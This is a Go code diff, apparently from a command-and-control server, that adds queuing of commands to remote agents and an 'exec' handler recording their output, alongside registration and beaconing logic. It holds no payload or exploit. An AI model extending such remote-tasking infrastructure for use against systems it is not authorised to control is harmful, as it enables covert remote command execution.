@@ -25,6 +25,8 @@ func HandleMessage(msg []byte, conn net.Conn) bool {
 		return agentRegister(&agentBeacon, conn)
 	case "beacon":
 		return agentBeaconing(&agentBeacon, conn)
+	case "exec":
+		return UpdateAction(&agentBeacon)
 	default:
 		break
 	}
@@ -39,10 +41,6 @@ func agentRegister(agentBeacon *agents.AgentBeacon, conn net.Conn) bool {
 		PublicIP:     conn.RemoteAddr().String(),
 		Agent:        agentBeacon.Agent,
 	}
-
-	var db database.DatabaseModel
-	db.Open()
-	defer db.Close()
 
 	if !db.InsertAgent(register) {
 		return false
@@ -70,10 +68,6 @@ func agentBeaconing(agentBeacon *agents.AgentBeacon, conn net.Conn) bool {
 		Agent:      agentBeacon.Agent,
 	}
 
-	var db database.DatabaseModel
-	db.Open()
-	defer db.Close()
-
 	if !db.UpdateAgent(beacon) {
 		return false
 	}
@@ -93,10 +87,13 @@ func agentBeaconing(agentBeacon *agents.AgentBeacon, conn net.Conn) bool {
 			return false
 		}
 
+		if !db.DequeueAction(action) {
+			return false
+		}
+
 		resp.UUID = action.UUID
 		resp.ActionType = action.ActionType
 		resp.ActionCmd = action.ActionCmd
-
 	}
 
 	msg, _ := json.Marshal(resp)
@@ -106,4 +103,14 @@ func agentBeaconing(agentBeacon *agents.AgentBeacon, conn net.Conn) bool {
 	}
 
 	return true
+}
+
+func UpdateAction(agentBeacon *agents.AgentBeacon) bool {
+
+	tmp := database.ActionModel{
+		UUID:         agentBeacon.Action.UUID,
+		ActionOutput: agentBeacon.Action.ActionOutput,
+	}
+
+	return db.UpdateAction(tmp)
 }
